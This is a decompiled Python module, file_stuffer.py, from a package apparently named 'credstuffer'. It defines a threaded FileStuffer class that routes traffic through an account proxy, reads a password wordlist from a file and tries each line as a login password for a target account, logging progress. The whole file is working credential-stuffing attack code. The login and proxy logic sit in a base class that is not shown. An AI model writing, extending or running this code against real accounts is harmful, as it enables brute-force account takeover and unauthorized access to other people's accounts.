# uncompyle6 version 3.6.7
# Python bytecode 3.6 (3379)
# Decompiled from: Python 3.8.2 (tags/v3.8.2:7b3ab59, Feb 25 2020, 23:03:10) [MSC v.1916 64 bit (AMD64)]
# Embedded file name: build/bdist.linux-x86_64/egg/credstuffer/file_stuffer.py
# Compiled at: 2020-04-05 08:14:43
# Size of source mod 2**32: 1297 bytes
import logging, threading
from credstuffer.stuffer import Stuffer

class FileStuffer(Stuffer, threading.Thread):
    """FileStuffer"""

    def __init__(self, account, filepath):
        self.logger = logging.getLogger('credstuffer')
        self.logger.info('Create class FileStuffer')
        Stuffer.__init__(self, account=account)
        threading.Thread.__init__(self)
        self.filepath = filepath

    def run(self) -> None:
        """ executes the run thread for account logins """
        self.set_account_proxy()
        self.logger.info('Open file {} for stuffing'.format(self.filepath))
        with open((self.filepath), 'r', encoding='utf-8', errors='ignore') as (f):
            for lineno, line in enumerate(f):
                password = line.strip('\n')
                self.account_login(password=password)
                if lineno % 1000 == 0:
                    self.logger.info('File {} with line number {} and password {}'.format(self.filepath, lineno, password))